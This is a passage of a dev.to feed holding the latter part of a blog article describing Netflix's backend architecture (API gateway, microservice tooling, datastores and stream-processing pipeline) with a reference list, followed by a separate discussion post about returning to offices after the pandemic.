&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--xVyhcEGQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uzh1rz679blx2rlhm9da.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--xVyhcEGQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uzh1rz679blx2rlhm9da.jpeg" alt="backend"&gt;&lt;/a&gt;&lt;/p&gt;
Backend Architecture



&lt;ol&gt;
&lt;li&gt;The Client sends a Play request to a Backend running on AWS. Netflix uses Amazon's Elastic Load Balancer (ELB) service to route traffic to its services.&lt;/li&gt;
&lt;li&gt;AWS ELB will forward that request to the API Gateway Service. Netflix uses Zuul as its API gateway, which is built to allow dynamic routing, traffic monitoring, and security, resilience to failures at the edge of the cloud deployment.&lt;/li&gt;
&lt;li&gt;Application API component is the core business logic behind Netflix operations. There are several types of API corresponding to different user activities such as Signup API, Discovery/Recommendation API for retrieving video recommendation. In this scenario, the forwarded request from API Gateway Service is handled by Play API.&lt;/li&gt;
&lt;li&gt;Play API will call a microservice or a sequence of microservices to fulfill the request. &lt;/li&gt;
&lt;li&gt;Microservices are mostly stateless small programs, there can be thousands of these services communicating with each other. &lt;/li&gt;
&lt;li&gt;Microservices can save or get data from a data store during this process.&lt;/li&gt;
&lt;li&gt;Microservices can send events for tracking user activities or other data to the Stream Processing Pipeline for either real-time processing of personalized recommendations or batch processing of business intelligence tasks.&lt;/li&gt;
&lt;li&gt;The data coming out of the Stream Processing Pipeline can be persistent to other data stores such as AWS S3, Hadoop HDFS, Cassandra, etc.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#3-backend-components"&gt;
  &lt;/a&gt;
  3. Backend Components
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#open-connect"&gt;
  &lt;/a&gt;
  Open Connect
&lt;/h3&gt;

&lt;p&gt;Everything that happens after you hit play on a video is handled by Open Connect. This system is responsible for streaming video to your device. The following diagram illustrates how the playback process works.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--LM75pN4H--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hdg8io3upt0ioogjvz6v.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--LM75pN4H--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hdg8io3upt0ioogjvz6v.png" alt="PlayBlackProcess"&gt;&lt;/a&gt;&lt;/p&gt;
Open Connect Design Image



&lt;ol&gt;
&lt;li&gt;OCAs ping AWS instances to report their health, the routes they have learned, and the files they have on them.&lt;/li&gt;
&lt;li&gt;A user on a client device requests playback of a title (TV show or movie) from the Netflix application in AWS.&lt;/li&gt;
&lt;li&gt;The Netflix playback service checks for the user's authorization, permission, and licensing, then chooses which files to serve the client taking into account the current network speed and client resolution.&lt;/li&gt;
&lt;li&gt;The steering service picks the OCA that the files should be served from, generates URLs for these OCAs, and hands it back to the playback service.&lt;/li&gt;
&lt;li&gt;The playback service hands over the URLs of the OCA to the client, The client requests for the video files from that OCA.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#zuul2api-gateway"&gt;
  &lt;/a&gt;
  Zuul2-API GATEWAY
&lt;/h2&gt;

&lt;p&gt;Netflix uses Amazon's Elastic Load Balancer (ELB) service to route traffic to services. ELB’s are set up such that load is balanced across zones first, then instances.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8_hh2n2I--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vb4u8c24qg9ftca8qgp9.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8_hh2n2I--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vb4u8c24qg9ftca8qgp9.png" alt="AmazonELB"&gt;&lt;/a&gt;&lt;/p&gt;
Amazon Elastic Load Balancer



&lt;p&gt;This load balancer routes request to the API gateway service; Netflix uses Zuul as its API gateway, It handles all the requests and performs the dynamic routing of microservice applications. It works as a front door for all the requests.&lt;/p&gt;

&lt;p&gt;For Example, /api/products is mapped to the product service, and /api/user is mapped to the user service. The Zuul Server dynamically routes the requests to the respective backend applications. Zuul provides a range of different types of filters that allows them to quickly and nimbly apply functionality to the edge service. &lt;/p&gt;

&lt;blockquote&gt;The Cloud Gateway team at Netflix runs and operates more than 80 clusters of Zuul 2, sending traffic to about 100 (and growing) backend service clusters which amount to more than 1 million requests per second. 
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://netflixtechblog.com/open-sourcing-zuul-2-82ea476cb2b3"&gt;open-sourcing-zuul-2&lt;/a&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--RngNusOd--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qkjl4fb94l51dx0qsbj3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--RngNusOd--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qkjl4fb94l51dx0qsbj3.png" alt="zuul2"&gt;&lt;/a&gt;&lt;/p&gt;
Zuul Architecture



&lt;p&gt;The Netty handlers on the front and back of the filters are mainly responsible for handling the network protocol, web server, connection management, and proxying work. With those inner workings abstracted away, the filters do all of the heavy liftings. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The inbound filters run before proxying the request and can be used for authentication, routing, or decorating the request. &lt;/li&gt;
&lt;li&gt;The endpoint filters can either be used to return a static response or proxy the request to the backend service. &lt;/li&gt;
&lt;li&gt;The outbound filters run after a response has been returned and can be used for things like metrics, or adding/removing custom headers.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The Zuul 2 Api gateway forwards the request to the appropriate Application API.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#application-api"&gt;
  &lt;/a&gt;
  Application API
&lt;/h2&gt;

&lt;p&gt;Currently, the Application APIs are defined under three categories: &lt;strong&gt;Signup API&lt;/strong&gt; -for non-member requests such as sign-up, billing, free trial, etc., &lt;strong&gt;Discovery API&lt;/strong&gt;-for search, recommendation requests, and &lt;strong&gt;Play API&lt;/strong&gt;- for streaming, view licensing requests, etc. When a user clicks signup, for example, Zuul will route the request to the Signup API. &lt;/p&gt;

&lt;p&gt;If you consider an example of an already subscribed user. Supposing the user clicks on play for the latest episode of peaky blinders, the request will be routed to the playback API. The API in turn calls several microservices under the hood. Some of these calls can be made in parallel because they don’t depend on each other. Others have to be sequenced in a specific order. The API contains all the logic to sequence and parallelize the calls as necessary. The device, in turn, doesn’t need to know anything about the orchestration that goes on under the hood when the customer clicks “play”.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--auctUWrK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k298u17sizjb8ib7xg65.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--auctUWrK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k298u17sizjb8ib7xg65.jpeg" alt="Api archi"&gt;&lt;/a&gt;&lt;/p&gt;
Netflix API Architecture



&lt;p&gt;Signup requests map to signup backend services, Playback requests, with some exceptions, map only to playback backend services, and similarly discovery APIs map to discovery services.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#hystrix-distributed-api-services-management"&gt;
  &lt;/a&gt;
  Hystrix- Distributed API Services Management
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://netflix.github.io/titus/"&gt;Hystrix&lt;/a&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--A1s-1P_h--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6ry3q3t2vizu7o55ixg3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--A1s-1P_h--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6ry3q3t2vizu7o55ixg3.png" alt="Hystrix"&gt;&lt;/a&gt;&lt;/p&gt;
Hystrix Architecture



&lt;p&gt;In any distributed environment (with a lot of dependencies), inevitably some of the many service dependencies fail. It can be unmanageable to monitor the health and state of all the services as more and more services will be stood up and some services may be taken down or simply break down. Hystrix comes with help by providing a user-friendly dashboard. &lt;strong&gt;Hystrix library&lt;/strong&gt; is used to control the interaction between these distributed services by adding some latency tolerance and fault tolerance logic. &lt;/p&gt;

&lt;p&gt;Consider this example from Netflix, they have a microservice that provides a tailored list of movies back to the user. If the service fails, they reroute the traffic to circumvent the failure to another vanilla microservice that simply returns the top 10 movies that are family-friendly. So they have this safe failover that they can go to and that is the classic example of first circuit breaking.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: &lt;/p&gt;
&lt;blockquote&gt;
&lt;em&gt;Netflix Hystrix is no longer in active development and is currently in maintenance mode. Some internal projects are currently being built with resilience4j&lt;/em&gt;&lt;br&gt;
&lt;/blockquote&gt;
&lt;br&gt;
&lt;a href="https://github.com/resilience4j/resilience4j"&gt;https://github.com/resilience4j/resilience4j&lt;/a&gt;
&lt;h3&gt;
  &lt;a href="#titus-container-management"&gt;
  &lt;/a&gt;
  Titus- Container Management
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://netflix.github.io/titus/"&gt;Titus&lt;/a&gt;&lt;br&gt;
Titus is a container management platform that provides scalable and reliable container execution and cloud-native integration with Amazon AWS.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--viDxQMxC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2k22xkjv5ed0vbc69oay.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--viDxQMxC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2k22xkjv5ed0vbc69oay.png" alt="titus-arch"&gt;&lt;/a&gt;&lt;/p&gt;
Titus Architecture



&lt;p&gt;It is a framework on top of Apache Mesos, a cluster management system that brokers available resources across a fleet of machines.&lt;br&gt;
Titus is run in production at Netflix, managing thousands of AWS EC2 instances and launching hundreds of thousands of containers daily for both batch and service workloads. Just think of it as the Netflix version of Kubernetes.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Titus runs about 3 million containers per week.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#datastores"&gt;
  &lt;/a&gt;
  Datastores
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#evcache"&gt;
  &lt;/a&gt;
  EVCache
&lt;/h3&gt;

&lt;p&gt;A cache's primary purpose is to increase data retrieval performance by reducing the need to access the underlying slower storage layer. Trading off capacity for speed, a cache typically stores a subset of data transiently.&lt;br&gt;
&lt;a href="https://github.com/Netflix/EVCache"&gt;EVCache&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Two uses cases for caching is to:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Provides fast access to frequently stored data.&lt;/li&gt;
&lt;li&gt;Provides fast access to computed(memoized) data. Netflix's microservices rely on caches for fast, reliable access to multiple types of data like a member’s viewing history, ratings, and personalized recommendations. 
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UARgk-J4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9e65uku3fk6jvgpjdsfp.png" alt="EVCache"&gt;EVCache Diagram

&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;EVCache is a memcached &amp;amp; spymemcached based caching solution that is mainly used for AWS EC2 infrastructure for caching frequently used data.&lt;br&gt;
EVCache is an abbreviation for:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Ephemeral - The data stored is for a short duration as specified by its TTL (Time To Live).&lt;/li&gt;
&lt;li&gt;Volatile - The data can disappear any time (Evicted).&lt;/li&gt;
&lt;li&gt;Cache - An in-memory key-value store.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#ssds-for-caching"&gt;
  &lt;/a&gt;
  SSDs for Caching
&lt;/h3&gt;

&lt;p&gt;Traditionally caching is done on the RAM. Storing large amounts of data on RAM is expensive. Hence Netflix decided to move some caching data to SSD. &lt;/p&gt;

&lt;blockquote&gt; Modern disk technologies based on SSD are providing fast access to data but at a much lower cost when compared to RAM. The cost to store 1 TB of data on SSD is much lower than storing the same amount using RAM.
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://netflixtechblog.com/evolution-of-application-data-caching-from-ram-to-ssd-a33d6fa7a690"&gt;Evolution of application Data Caching&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#mysql"&gt;
  &lt;/a&gt;
  MySQL
&lt;/h3&gt;

&lt;p&gt;Netflix uses AWS EC2 instances of MYSQL for its Billing infrastructure. Billing infrastructure is responsible for managing the billing state of Netflix members. This includes keeping track of open/paid billing periods, the amount of credit on the member’s account, managing the payment status of the member, initiating charge requests, and what date the member has paid through.&lt;/p&gt;

&lt;p&gt;The payment processor needed the ACID capabilities of an RDBMS to process charge transactions.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--yodoq7Yp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2cdd1qpqbl3ckw6ebyn4.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--yodoq7Yp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2cdd1qpqbl3ckw6ebyn4.png" alt="Netflix Datastore"&gt;&lt;/a&gt;&lt;/p&gt;
Netflix Datastore



&lt;h3&gt;
  &lt;a href="#apache-cassandra"&gt;
  &lt;/a&gt;
  Apache Cassandra
&lt;/h3&gt;

&lt;p&gt;Cassandra is a free and open-source distributed wide column store NoSQL database designed to handle large amounts of data across many commodity servers, providing high availability with no single point of failure.&lt;/p&gt;

&lt;p&gt;Netflix uses Cassandra for its scalability, lack of single points of failure, and cross-regional deployments. ” In effect, a single global Cassandra cluster can simultaneously service applications and asynchronously replicate data across multiple geographic locations.&lt;/p&gt;

&lt;p&gt;Netflix stores all kinds of data across their Cassandra DB instances. All user collected event metrics are stored on Cassandra. &lt;/p&gt;

&lt;p&gt;As user data began to increase there needed to be a more efficient way to manage data storage. Netflix Redesigned data storage architecture with two main goals in mind:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Smaller Storage Footprint.&lt;/li&gt;
&lt;li&gt;Consistent Read/Write Performance as viewing per member grows.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The solution to the large data problem was to compress the old rows. Data were divided into two types:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Live Viewing History (LiveVH): Small number of recent viewing records with frequent updates. The data is stored in uncompressed form.&lt;/li&gt;
&lt;li&gt;Compressed Viewing History (CompressedVH): A large number of older viewing records with rare updates. The data is compressed to reduce the storage footprint. Compressed viewing history is stored in a single column per row key.
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SC5qOko---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8w132e8676mx2xzmti5x.png" alt="CompressedVH"&gt;Compressed Viewing History

&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#stream-processing-pipeline"&gt;
  &lt;/a&gt;
  Stream Processing Pipeline
&lt;/h2&gt;

&lt;p&gt;Did you know that Netflix personalizes movie artwork just for you?. You might be surprised to learn the image shown for each video is selected specifically for you. Not everyone sees the same image.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--KUAlDtf---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6zbpyp23tozgvhsng18z.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--KUAlDtf---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6zbpyp23tozgvhsng18z.jpeg" alt="stranger-things"&gt;&lt;/a&gt;&lt;br&gt;
Netflix tries to select the artwork highlighting the most relevant aspect of a video to you based on the data they have learned about you on your viewing history and interests.&lt;/p&gt;

&lt;p&gt;Stream Processing Data Pipeline has become Netflix’s data backbone of business analytics and personalized recommendation tasks. It is responsible for producing, collecting, processing, aggregating, and moving all microservice events to other data processors in near real-time.&lt;/p&gt;

&lt;blockquote&gt;
Streaming data is data that is generated continuously by thousands of data sources, which typically send in the data records simultaneously, and in small sizes (order of Kilobytes). Streaming data includes a wide variety of data such as log files generated by customers using your mobile or web applications, e-commerce purchases, in-game player activity, information from social networks, financial trading floors, or geospatial services, and telemetry from connected devices or instrumentation in data centers.
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://aws.amazon.com/streaming-data/"&gt;AWS- What is streaming Data?&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This data needs to be processed sequentially and incrementally on a record-by-record basis or over sliding time windows and used for a wide variety of analytics including correlations, aggregations, filtering, and sampling. &lt;/p&gt;

&lt;p&gt;Information derived from such analysis gives companies visibility into many aspects of their business and customer activity such as –service usage (for metering/billing), server activity, website clicks, and geo-location of devices, people, and physical goods –and enables them to respond promptly to emerging situations. For example, businesses can track changes in public sentiment on their brands and products by continuously analyzing social media streams, and respond in a timely fashion as the necessity arises.&lt;/p&gt;

&lt;p&gt;The stream processing platform processes trillions of events and petabytes of data per day.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--eOrsO_p9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yfv8wddthnk9m37uf628.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--eOrsO_p9--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yfv8wddthnk9m37uf628.png" alt="streaming"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Viewing History Service captures all the videos that are played by members. Beacon is another service that captures all impression events and user activities within Netflix, All the data collected by the Viewing History and Beacon services are sent to Kafka.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#apache-kafka-analyzing-streaming-data"&gt;
  &lt;/a&gt;
  Apache Kafka- Analyzing Streaming Data
&lt;/h3&gt;

&lt;p&gt;Kafka is open-source software that provides a framework for storing, reading, and analyzing streaming data.&lt;/p&gt;

&lt;blockquote&gt;Netflix embraces Apache Kafka® as the de-facto standard for its eventing, messaging, and stream processing needs. Kafka acts as a bridge for all point-to-point and Netflix Studio wide communications. 
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://www.confluent.io/blog/how-kafka-is-used-by-netflix/"&gt;How Kafka is used by Netflix&lt;/a&gt;&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--nwSzfq1I--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/78gmjgardflv97rrwxyj.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--nwSzfq1I--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/78gmjgardflv97rrwxyj.png" alt="Kafka"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#apache-chukwe-analyzing-streaming-data"&gt;
  &lt;/a&gt;
  Apache Chukwe- Analyzing Streaming Data
&lt;/h3&gt;

&lt;p&gt;Apache Chukwe is an open-source data collection system for collecting logs or events from a distributed system. It is built on top of HDFS and Map-reduce framework. It comes with Hadoop’s scalability and robustness features. It includes a lot of powerful and flexible toolkits to display, monitor, and analyze data. Chukwe collects the events from different parts of the system; From Chukwe you can do monitoring, analysis or you can use the dashboard to view the events. Chukwe writes the event in the Hadoop file sequence format (S3).&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#apache-spark-analyzing-streaming-data"&gt;
  &lt;/a&gt;
  Apache Spark - Analyzing Streaming Data
&lt;/h3&gt;

&lt;p&gt;Netflix uses Apache Spark and Machine learning for Movie recommendation. Apache Spark is an open-source unified analytics engine for large-scale data processing. &lt;/p&gt;

&lt;p&gt;On a live user request, the aggregated play popularity(How many times is a video played) and take rate(Fraction of play events over impression events for a given video) data along with other explicit signals such as members’ viewing history and past ratings are used to compute a personalized content for the user. The following figure shows the end-to-end infrastructure for building user movie recommendations.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MFQPZntP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3335yl4ojj3h2fyn95hx.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MFQPZntP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3335yl4ojj3h2fyn95hx.png" alt="data-processor-engine"&gt;&lt;/a&gt;&lt;/p&gt;
Data Processing Engine



&lt;h3&gt;
  &lt;a href="#elastic-search-error-logging-and-monitoring"&gt;
  &lt;/a&gt;
  Elastic Search - Error Logging and Monitoring
&lt;/h3&gt;

&lt;p&gt;Netflix uses elastic search for data visualization, customer support, and for error detection in the system.&lt;/p&gt;

&lt;p&gt;Elasticsearch is a search engine based on the Lucene library. It provides a distributed, multitenant-capable full-text search engine with an HTTP web interface and schema-free JSON documents.&lt;/p&gt;

&lt;p&gt;With elastic search, they can easily monitor the state of the system and troubleshoot error logs and failures.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;This article has provided a detailed analysis of the Netflix Backend architecture. You can refer to these references for more information.&lt;/p&gt;

&lt;p&gt;Follow me here and across my social media for more content like this &lt;a href="https://www.linkedin.com/in/olugbenga-elegberun/"&gt;Linkedin&lt;/a&gt;. &lt;a href="https://twitter.com/ElegberunDaniel?s=09"&gt;Twitter&lt;/a&gt; &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#references"&gt;
  &lt;/a&gt;
  REFERENCES
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href="https://netflix.github.io/titus/overview/"&gt;Titus&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://netflixtechblog.com/open-sourcing-zuul-2-82ea476cb2b3"&gt;Open Sourcing Zuul&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://openconnect.netflix.com/Open-Connect-Overview.pdf"&gt;Open Connect&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.nexsoftsys.com/articles/how-netflix-backend-system-operates.html"&gt;How Netflix Backend Operates&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/swlh/a-design-analysis-of-cloud-based-microservices-architecture-at-netflix-98836b2da45f"&gt;A Design Analysis Of Cloud-Based Microservices Architecture At Netflix&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@narengowda/netflix-system-design-dbec30fede8d"&gt;Netflix System Design&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://riteeksrivastava.medium.com/hystrix-what-is-it-and-why-is-it-used-f84614c8df5e"&gt;Hystrix What is it and Why is it Used&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://netflixtechblog.com/engineering-trade-offs-and-the-netflix-api-re-architecture-64f122b277dd"&gt;Engineering Tradeoffs and the Netflix API Re-architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://netflixtechblog.com/application-data-caching-using-ssds-5bf25df851ef"&gt;Application Data Caching Using ssds&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://netflixtechblog.com/evolution-of-application-data-caching-from-ram-to-ssd-a33d6fa7a690"&gt;Evolution Of Application Data Caching From Ram To ssd&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://netflixtechblog.com/netflix-billing-migration-to-aws-451fba085a4"&gt;Netflix Billing Migration To Aws&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://netflixtechblog.com/optimizing-the-netflix-api-5c9ac715cf19"&gt;Optimizing The Netflix Api&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://netflixtechblog.com/whats-trending-on-netflix-f00b4b037f61"&gt;What's Trending On Netflix&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://netflixtechblog.com/evolution-of-the-netflix-data-pipeline-da246ca36905"&gt;Evolution Of The Netflix Data Pipeline&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.javatpoint.com/zuul-api-gateway"&gt;Zuul API Gateway&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/CAP_theorem"&gt;CAP_theorem&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://highscalability.com/blog/2017/12/11/netflix-what-happens-when-you-press-play.html?currentPage=2"&gt;What Happens When You Press Play&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://netflixtechblog.com/scaling-time-series-data-storage-part-i-ec2b6d44ba39"&gt;Scaling Time Series Data Storage Part1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.geeksforgeeks.org/system-design-netflix-a-complete-architecture/"&gt;Netflix-High-Level-System-Architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.confluent.io/blog/how-kafka-is-used-by-netflix/"&gt;How-Kafka-is-used-by-Netflix&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

</description>
      <category>openconnect</category>
      <category>systemdesign</category>
      <category>netflixbackend</category>
      <category>aws</category>
    </item>
    <item>
      <title>The 'New Normal' - what does your work setting look like post pandemic? </title>
      <author>Josefine Schfr</author>
      <pubDate>Thu, 24 Jun 2021 07:51:51 +0000</pubDate>
      <link>https://dev.to/s2engineers/the-new-normal-what-does-your-work-setting-look-like-post-pandemic-171o</link>
      <guid>https://dev.to/s2engineers/the-new-normal-what-does-your-work-setting-look-like-post-pandemic-171o</guid>
      <description>&lt;p&gt;It feels like many people are slowly re-emerging from seemingly endless pandemic hibernation, digging their way out of their remote locations, reluctantly changing their sweats for something less comfortable and returning to their offices. The timeline and speed of this process of course highly varies depending on where you are located, but sooner or later, most of us will need to consider yet another ‘new normal’. &lt;/p&gt;

&lt;p&gt;And just like all the new routines we had to adapt to over the past 18 months, whether it's working from home, working more or less or different hours or annoying (yet important!) hygiene concepts at the office - we now have to re-think the way we want to work together all over again. &lt;/p&gt;

&lt;p&gt;&lt;em&gt;But what does that mean?&lt;/em&gt; &lt;/p&gt;

&lt;p&gt;At our organisation, we were allowed to work from home over the past months and as it looks like will keep this privilege even as the world opens up again. This of course has many individual benefits but also makes working together in large teams a bigger challenge. This ‘remote focus’ (as our new way of working was coined) means most meetings will be held remotely and our office spaces will change to fit our new needs: focus areas, spaces to collaborate, little phone booths for privacy etc. &lt;/p&gt;

&lt;p&gt;But what does this &lt;em&gt;really&lt;/em&gt; mean? &lt;/p&gt;

&lt;p&gt;Hearing we might not have fixed desks and or team spaces, but book desks or areas according to our needs honestly scares me a little. Sure, it’s great to guarantee the flexibility to take every meeting from any location, to possibly save office space we wouldn’t use and try to treat both remote and on location as equally as possible - but what if we lose our sense of community? I’m afraid I’ll end up sitting in an anonymous ‘focus area’ at a steril desk and only see my teammates in remote video calls. That can’t be the future, right?&lt;/p&gt;

&lt;p&gt;How can we manage remote and real-life cooperation? What do the new office spaces even need? Should we maybe re-think the way we work all together? &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How are you addressing these issues in your organisation? Did you already return to the offices? Did you learn something in 1+ year working from home that you wish you knew before? (How) did you manage to keep the community spirit alive?&lt;/strong&gt; I’m super curious to learn how you are doing this and if you already got some post-pandemic office hacks :) &lt;/p&gt;

</description>
      <category>discuss</category>
      <category>remotework</category>
